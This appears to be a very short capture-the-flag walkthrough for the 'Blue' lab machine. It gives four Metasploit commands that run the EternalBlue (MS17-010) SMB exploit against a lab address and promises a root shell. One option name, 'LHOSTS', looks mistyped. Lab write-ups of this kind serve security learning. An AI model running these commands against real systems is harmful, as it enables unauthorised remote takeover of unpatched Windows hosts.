# Blue
## Simply Eternal Blue

> Go to msfconsole and execute these commands to execute eternalblue exploit

```
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.40
set LHOSTS tun0
run
```

*Boom, You got yourself a root shell!*
